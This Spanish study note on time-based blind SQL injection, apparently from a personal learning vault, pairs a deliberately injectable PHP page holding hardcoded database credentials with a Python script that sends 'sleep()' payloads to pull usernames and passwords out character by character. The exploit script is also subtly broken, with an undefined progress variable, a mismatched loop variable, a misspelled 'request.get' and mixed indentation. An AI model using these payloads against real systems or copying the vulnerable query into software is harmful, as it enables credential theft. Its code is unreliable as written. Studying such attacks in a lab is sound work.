-----------
en- Tags: #sql #sqli #basesdatos 
---------------------
# Definicion
Este tipo de inyección SQL utiliza una consulta que **tarda mucho tiempo en ejecutarse** para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búsqueda en una tabla y se añade un retardo en la consulta, se puede utilizar ese retardo para obtener información adicional.

## Ejemplo Query para saber si es basada en tiempo:




- Codigo para detecion de [[SQLI Basada en Tiempo]]
```php
<?php
    $server = "localhost";
    $username = "luisillo";
    $password = "luis123";
    $database = "H4ck4u";

    //Conexion a l a BD
    $conn = new mysqli($server, $username, $password, $database);

    $id = $_GET['id'];

    $data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn));

    $response =  mysqli_fetch_array($data);

    echo $response['username'];
?>
```


```python3                                         
 #!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1);
    
#CTRL + C
signal.signal(signal.SIGINT, def_handler)


#Variables  Globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza Bruta")
    p1.status ("Iniciando Ataque...")

    time.sleep(2)

    p2.log.progress("Datos extraidos: ")

    extracted_info  = ""

    for position in range(1,150):
        for characters in range(33,126):
            sqli_url = main_url + "?id = 1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.40),1)" % (position,character)
            
            p1.status(sqli_url)
	        
	        time_start = time.time()

            r = request.get(sqli_url)
    
			time_end = time.time()	
	 
			 if time_end - time_start > 0.40:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break     

				  
if __name__ == '__main__':
    makeSQLI()
       

```